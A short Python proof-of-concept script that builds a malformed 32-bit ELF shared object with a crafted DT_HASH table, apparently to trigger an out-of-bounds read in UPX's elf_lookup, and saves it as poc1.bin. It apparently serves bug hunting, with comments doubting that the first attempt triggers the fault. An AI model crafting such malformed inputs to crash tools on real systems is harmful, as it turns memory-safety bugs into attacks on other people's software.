import struct
# Minimal ELF32 little-endian ET_DYN with malformed DT_HASH causing UPX elf_lookup chain OOB.
PAGE=0x1000
# offsets
EH=52; PH=32; phoff=EH; phnum=2
load_off=0; load_vaddr=0x10000
# place sections/tables aligned
dyn_off=0x100; dyn_v=load_vaddr+dyn_off
hash_off=0x180; hash_v=load_vaddr+hash_off
sym_off=0x190; sym_v=load_vaddr+sym_off
str_off=0x1d0; str_v=load_vaddr+str_off
file_size=0x1e8
buf=bytearray(b'\0'*file_size)
# ELF header
ident=bytearray(16); ident[:4]=b'\x7fELF'; ident[4]=1; ident[5]=1; ident[6]=1; ident[7]=3 # Linux/System V-ish
struct.pack_into('<16sHHIIIIIHHHHHH', buf, 0, bytes(ident), 3, 3, 1, 0, phoff, 0, 0, EH, PH, phnum, 0, 0, 0)
# Program headers: PT_LOAD covers whole file, PT_DYNAMIC points dyn
# p_type,p_offset,p_vaddr,p_paddr,p_filesz,p_memsz,p_flags,p_align
struct.pack_into('<IIIIIIII', buf, phoff, 1, load_off, load_vaddr, load_vaddr, file_size, file_size, 5, PAGE)  # R+X
struct.pack_into('<IIIIIIII', buf, phoff+PH, 2, dyn_off, dyn_v, dyn_v, 0x40, 0x40, 6, 4)       # RW dynamic
# Dynamic entries. Tags: HASH=4, STRTAB=5, SYMTAB=6, STRSZ=10, NULL=0
entries=[(4,hash_v),(6,sym_v),(5,str_v),(10,16),(0,0),(0,0),(0,0),(0,0)]
for i,(tag,val) in enumerate(entries): struct.pack_into('<II',buf,dyn_off+i*8,tag,val)
# DT_HASH at hash_off. nbucket=1, nchain=1, bucket[0]=2. No valid chains[2] in hash table.
# m for JNI_OnLoad mod 1 is 0. chains base = hash+12, chains[2] = hash+20 = 0x194, inside dynsym bytes.
# This first attempt may read in-bounds file but semantically OOB hash; ASan may not fire unless hash table object is bounded separately.
struct.pack_into('<III', buf, hash_off, 1, 1, 2)
# dynsym at sym_off. Need symnum_max > 2, so symtab end is strtab: (0x1d0-0x190)/16=4 symbols.
# symbol 2 has st_name offset to non-matching string.
for i in range(4):
    st_name = 1 if i==2 else 0
    struct.pack_into('<IIIBBH', buf, sym_off+i*16, st_name, 0, 0, 0, 0, 0)
# dynstr
buf[str_off:str_off+16]=b'\0not_jni\0xxxxxxx'[:16]
open('/workspace/poc1.bin','wb').write(buf)
print(len(buf))
